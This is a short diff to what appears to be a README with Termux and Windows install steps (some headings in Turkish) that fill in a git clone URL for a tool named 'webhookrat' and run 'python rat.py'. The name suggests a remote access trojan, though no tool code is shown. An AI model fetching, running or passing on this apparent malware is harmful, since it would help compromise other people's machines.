@@ -12,7 +12,7 @@ pkg install git
 
 pip install requests
 
-git clone
+git clone https://github.com/zeus289x/webhookrat.git
 
 cd webhookrat
 
@@ -21,7 +21,7 @@ python rat.py
 # Windows Kurulum
 python -m pip install --upgrade pip && pip install requests
 
-git clone 
+git clone https://github.com/zeus289x/webhookrat.git
 
 cd webhookrat
 
